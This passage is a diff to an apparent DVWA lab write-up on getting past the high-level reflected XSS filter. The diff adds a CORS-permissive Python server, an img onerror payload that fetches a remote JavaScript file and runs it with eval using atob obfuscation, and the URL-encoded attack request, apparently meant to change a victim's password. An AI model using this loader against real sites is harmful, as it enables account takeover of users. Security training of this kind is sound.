@@ -34,14 +34,39 @@ xhr.onload = function() {
 };
 xhr.send(null);
 
+We save this payload onto a file called 'high.js'
+
 -----------------
 
-Now we need to find a way to execute this JS payload onto the victim browser.
+Now we need to find a way to execute this JS payload onto the victim browser. To avoid the block of the hard challenge of the reflected XSS, the idea is to write a small loader that loads a much bigger javascript file and executes it with eval. We can load this file by creating a malicious server which disables CORS checks. The code for such server is shown below
 
-TODO...
+#!/usr/bin/env python3
+
+from http.server import HTTPServer, SimpleHTTPRequestHandler, test
+import sys
+
+class CORSRequestHandler (SimpleHTTPRequestHandler):
+    def end_headers (self):
+        self.send_header('Access-Control-Allow-Origin', '*')
+        SimpleHTTPRequestHandler.end_headers(self)
+
+if __name__ == '__main__':
+    test(CORSRequestHandler, HTTPServer, port=int(sys.argv[1]) if len(sys.argv) > 1 else 8000)
+
+We save that in high-cors-server.py and then execute it as follows
+
+ python3 high-cors-server.py
+
+Once we have that running, we can use the following payload on the high reflected XSS challenge page of DVWA
+
+ <img src='#' onerror="var xhr = new XMLHttpRequest(); xhr.open('GET', 'http://localhost:8000/high.js', false); xhr.onload = function () {eval(this[atob('cmVzcG9uc2VUZXh0')])}; xhr.send(null); " />
+
+This payload is encoded into the following GET request. We can control the password
+   http://evil/vulnerabilities/xss_r/?name=%3Cimg+src%3D%27%23%27+onerror%3D%22var+xhr+%3D+new+XMLHttpRequest%28%29%3B+xhr.open%28%27GET%27%2C+%27http%3A%2F%2Flocalhost%3A8000%2Fhigh.js%27%2C+false%29%3B+xhr.onload+%3D+function+%28%29+%7Beval%28this%5Batob%28%27cmVzcG9uc2VUZXh0%27%29%5D%29%7D%3B+xhr.send%28null%29%3B+%22+%2F%3E
 
 -----------------
 
 References
 
+- https://stackoverflow.com/questions/21956683/enable-access-control-on-simple-http-server
 - https://labs.withsecure.com/publications/getting-real-with-xss
